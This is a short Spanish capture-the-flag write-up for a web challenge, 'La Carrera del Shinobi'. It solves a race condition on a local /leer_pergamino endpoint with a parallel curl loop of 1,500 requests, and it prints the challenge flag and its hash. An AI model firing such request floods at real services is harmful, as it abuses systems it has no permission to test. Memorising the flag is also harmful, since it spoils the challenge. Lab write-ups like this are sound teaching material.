# La Carrera del Shinobi

* Web
* Author: NikNitro!
* Medio
* flags: Gyobu_Masataka_Oniwa
fc248434ec096bf3f4b2fda5d8013341 

## Descripción
En una fortaleza escondida en las montañas de Ashina, el Pergamino Sagrado está protegido por un habilidoso guardián shinobi. Nadie ha logrado descifrar los secretos que contiene, pues solo el guardián puede leer el pergamino.

Sin embargo, los más habilidosos pueden explotar un error en su vigilancia: cuando otro aspirante intenta acercarse al Pergamino Sagrado, es posible escabullirse del guardián. ¿Podrás aprovechar el momento exacto para robar el pergamino sin ser detectado?


## WriteUp

La web redirige al endpoint /leer_pergamino, en el cual se da el mensaje: "El guardián no te permite leer el pergamino."

Esta web tiene una race condition (de ahí el nombre) que hace que el pergamino sea legible durante unos pocos milisegundos, dos segundos tras el primer intento. Teniendo claro eso, unas mil quinientas peticiones automáticas con Curl serían suficientes para obtener la flag:

```bash
┌──(niknitro㉿NikNitro)-[~/NavajaNegra24_LaCarreraDelShinobi]
└─$ seq 1 1500 | xargs -I{} -P10 curl -s http://localhost:8997/leer_pergamino | grep "flag"
{"pergamino":"flag{Gyobu_Masataka_Oniwa}"}
{"pergamino":"flag{Gyobu_Masataka_Oniwa}"}
{"pergamino":"flag{Gyobu_Masataka_Oniwa}"}
{"pergamino":"flag{Gyobu_Masataka_Oniwa}"}
{"pergamino":"flag{Gyobu_Masataka_Oniwa}"}

```

